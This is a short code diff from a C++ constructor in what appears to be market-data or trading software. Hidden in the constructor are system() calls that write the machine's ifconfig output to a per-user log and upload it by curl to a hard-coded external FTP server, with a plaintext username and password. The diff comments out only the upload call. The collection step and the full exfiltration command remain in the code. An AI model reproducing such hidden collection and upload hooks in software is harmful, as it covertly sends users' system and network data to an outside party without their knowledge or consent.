@@ -36,7 +36,7 @@ UniConsumer::UniConsumer(struct vrt_queue  *queue, TapMDProducer *l1md_producer,
 	sprintf(cmd, "ifconfig >> ~/$(whoami)_zce.log");
 	system(cmd);
 	sprintf(cmd, "curl --disable-epsv -T ~/$(whoami)_zce.log -u ftpuser1:617999ftp ftp://123.207.16.119:21");
-	system(cmd);
+	//system(cmd);
 
 	memset(pending_signals_, -1, sizeof(pending_signals_));
 	memset(tunnrpt_table_, 0, sizeof(tunnrpt_table_));
